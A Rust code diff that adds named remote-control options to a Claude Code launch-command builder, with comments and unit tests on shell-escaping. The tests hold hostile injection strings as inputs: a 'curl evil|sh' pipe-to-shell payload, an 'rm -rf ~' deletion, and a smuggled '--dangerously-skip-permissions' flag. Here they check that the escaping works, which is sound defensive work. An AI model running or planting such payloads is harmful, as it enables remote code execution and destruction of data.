@@ -17,6 +17,7 @@ use std::path::{Path, PathBuf};
 use crate::models::session::{Session, SessionType};
 use crate::models::stage::Stage;
 use crate::models::worktree::Worktree;
+use crate::remote_control::RemoteControlInvocation;
 
 pub use detection::detect_terminal;
 pub(crate) use launch::prepare_session_launch;
@@ -59,7 +60,7 @@ fn window_exists_for_terminal(title: &str, terminal: &super::emulator::TerminalE
 /// Build the `claude` invocation string shared by all native spawn sites.
 ///
 /// Produces `"{claude_path} --model {model} --effort {effort} --permission-mode
-/// {permission_mode} {escaped_prompt}[ --remote-control]"`.
+/// {permission_mode} {escaped_prompt}[ --remote-control[=name]]"`.
 ///
 /// `--permission-mode` is passed on the CLI rather than left to
 /// `permissions.defaultMode` in the worktree's `settings.local.json`, because
@@ -71,37 +72,59 @@ fn window_exists_for_terminal(title: &str, terminal: &super::emulator::TerminalE
 /// execution. The value is the camelCase spelling Claude Code's
 /// `--permission-mode` flag accepts (`auto`, `acceptEdits`, `plan`, `default`).
 ///
-/// The `--remote-control` flag is appended only when `remote_control_enabled`
-/// is true — `claude --remote-control` exits non-zero when its prerequisites
-/// are unmet, so it must never be passed unconditionally.
+/// The `--remote-control` flag is emitted per `remote_control`:
+/// [`RemoteControlInvocation::Disabled`] omits it entirely (`claude
+/// --remote-control` exits non-zero when its prerequisites are unmet, so it
+/// must never be passed unconditionally), [`RemoteControlInvocation::Bare`]
+/// passes the flag with no argument, and [`RemoteControlInvocation::Named`]
+/// passes `--remote-control=<name>`. `Bare` exists because older claude
+/// versions accept the flag but not its optional name argument; the two are
+/// told apart by the `--help` probe in `remote_control.rs`
+/// ([`crate::remote_control::resolve_invocation`] via
+/// `cached_named_arg_supported`).
 ///
-/// `--remote-control [name]` takes an *optional* argument. It MUST come after
-/// the positional prompt: placed before it, the arg parser swallows the
-/// prompt as the RC session name and claude starts with no initial prompt
-/// (the session sits idle / "stuck").
+/// The `Named` value is joined with `=` rather than a space. `--remote-control
+/// [name]` takes an *optional* argument: a space-separated value beginning
+/// with `-` risks being reparsed as the NEXT option rather than consumed as
+/// the name (`shell_escape` does not protect against this — a leading `-` is
+/// not a shell metacharacter, so it is passed through unquoted). The `=` form
+/// binds the value unambiguously regardless of its first character.
 ///
-/// `claude_path`, `model`, `effort`, and `permission_mode` are passed RAW and
-/// shell-escaped here. This is a command-construction trust boundary: model
-/// strings containing shell metacharacters would otherwise be glob-expanded by
-/// the shell, and a tampered effort such as `high; curl evil|sh #` would be
-/// command injection. `escaped_prompt` is pre-escaped by the caller (it is
-/// built from a trusted signal path).
+/// The flag MUST still come after the positional prompt: placed before it,
+/// the arg parser can swallow the prompt as the RC session name (for `Bare`,
+/// a following non-flag token is exactly what the optional-argument parser
+/// would otherwise consume) and claude starts with no initial prompt (the
+/// session sits idle / "stuck").
+///
+/// `claude_path`, `model`, `effort`, `permission_mode`, and the `Named`
+/// session name are passed RAW and shell-escaped here. This is a
+/// command-construction trust boundary: model strings containing shell
+/// metacharacters would otherwise be glob-expanded by the shell, and a
+/// tampered effort such as `high; curl evil|sh #` would be command injection.
+/// The `Named` value carries the same exposure — it is derived from a stage
+/// name that originates in plan YAML — so it is escaped alongside them (the
+/// `=` join additionally closes the leading-`-` flag-reparsing risk noted
+/// above, which shell-escaping alone does not).
+/// `escaped_prompt` is pre-escaped by the caller (it is built from a trusted
+/// signal path).
 pub(crate) fn build_claude_command(
     claude_path: &str,
     model: &str,
     effort: &str,
     permission_mode: &str,
-    remote_control_enabled: bool,
+    remote_control: &RemoteControlInvocation,
     escaped_prompt: &str,
 ) -> String {
     let claude_path = escape(Cow::Borrowed(claude_path));
     let model = escape(Cow::Borrowed(model));
     let effort = escape(Cow::Borrowed(effort));
     let permission_mode = escape(Cow::Borrowed(permission_mode));
-    let remote_control_flag = if remote_control_enabled {
-        " --remote-control"
-    } else {
-        ""
+    let remote_control_flag = match remote_control {
+        RemoteControlInvocation::Disabled => String::new(),
+        RemoteControlInvocation::Bare => " --remote-control".to_string(),
+        RemoteControlInvocation::Named(name) => {
+            format!(" --remote-control={}", escape(Cow::Borrowed(name.as_str())))
+        }
     };
     format!(
         "{claude_path} --model {model} --effort {effort} --permission-mode {permission_mode} {escaped_prompt}{remote_control_flag}"
@@ -491,7 +514,7 @@ mod tests {
             "opus",
             "xhigh",
             "auto",
-            false,
+            &RemoteControlInvocation::Disabled,
             "'prompt'",
         );
         assert_eq!(
@@ -502,13 +525,13 @@ mod tests {
     }
 
     #[test]
-    fn build_claude_command_appends_remote_control_when_enabled() {
+    fn build_claude_command_appends_bare_remote_control_when_enabled() {
         let cmd = build_claude_command(
             "/usr/bin/claude",
             "sonnet",
             "high",
             "auto",
-            true,
+            &RemoteControlInvocation::Bare,
             "'prompt'",
         );
         // `sonnet`/`high`/`auto`/`/usr/bin/claude` contain only shell-safe
@@ -534,7 +557,7 @@ mod tests {
             "opus",
             "xhigh",
             "acceptEdits",
-            false,
+            &RemoteControlInvocation::Disabled,
             "'prompt'",
         );
         assert!(cmd.contains("--permission-mode acceptEdits"));
@@ -555,7 +578,7 @@ mod tests {
             "sonnet",
             "high; curl evil|sh #",
             "auto",
-            false,
+            &RemoteControlInvocation::Disabled,
             "'prompt'",
         );
         // The whole effort token is single-quoted, so no `;`/`|`/`#` is active.
@@ -572,9 +595,68 @@ mod tests {
             "sonnet",
             "high",
             "auto",
-            false,
+            &RemoteControlInvocation::Disabled,
             "'prompt'",
         );
         assert!(cmd.starts_with("'/opt/My Tools/claude' --model sonnet"));
+    }
+
+    #[test]
+    fn build_claude_command_appends_named_remote_control_after_prompt() {
+        let cmd = build_claude_command(
+            "/usr/bin/claude",
+            "sonnet",
+            "high",
+            "auto",
+            &RemoteControlInvocation::Named("My Stage".to_string()),
+            "'prompt'",
+        );
+        // The `=` joins the name to the flag as a single CLI token.
+        assert!(cmd.ends_with("--remote-control='My Stage'"), "cmd: {cmd}");
+        // Same ordering constraint as the bare flag: the optional [name] arg
+        // would otherwise swallow the prompt positional.
+        let rc_idx = cmd.find("--remote-control").unwrap();
+        let prompt_idx = cmd.find("'prompt'").unwrap();
+        assert!(prompt_idx < rc_idx);
+    }
+
+    #[test]
+    fn build_claude_command_named_remote_control_rejects_leading_dash_reparsing() {
+        // A name starting with `-` must not be re-parseable as a separate CLI
+        // flag: `shell_escape` treats `-` as shell-safe and passes it through
+        // unquoted, so the `=` join (not shell quoting) is what prevents claude's
+        // own optional-argument parser from treating this as a new option.
+        let cmd = build_claude_command(
+            "/usr/bin/claude",
+            "sonnet",
+            "high",
+            "auto",
+            &RemoteControlInvocation::Named("--dangerously-skip-permissions".to_string()),
+            "'prompt'",
+        );
+        assert!(
+            cmd.contains("--remote-control=--dangerously-skip-permissions"),
+            "the whole name must be bound to --remote-control via '=' as one token: {cmd}"
+        );
+        // There must be no SPACE-separated occurrence of the bare flag name,
+        // which is what an optional-argument parser would treat as a new option.
+        assert!(!cmd.contains("--remote-control --dangerously-skip-permissions"));
+    }
+
+    #[test]
+    fn build_claude_command_escapes_named_remote_control_injection() {
+        // S-3: a stage name from plan YAML must be neutralized, not
+        // interpolated raw into the exec'd command line.
+        let cmd = build_claude_command(
+            "/usr/bin/claude",
+            "sonnet",
+            "high",
+            "auto",
+            &RemoteControlInvocation::Named("x; rm -rf ~".to_string()),
+            "'prompt'",
+        );
+        // The whole name is single-quoted, so no `;`/`~` is active.
+        assert!(cmd.contains("--remote-control='x; rm -rf ~'"), "cmd: {cmd}");
+        assert!(!cmd.contains("--remote-control x; rm"));
     }
 }
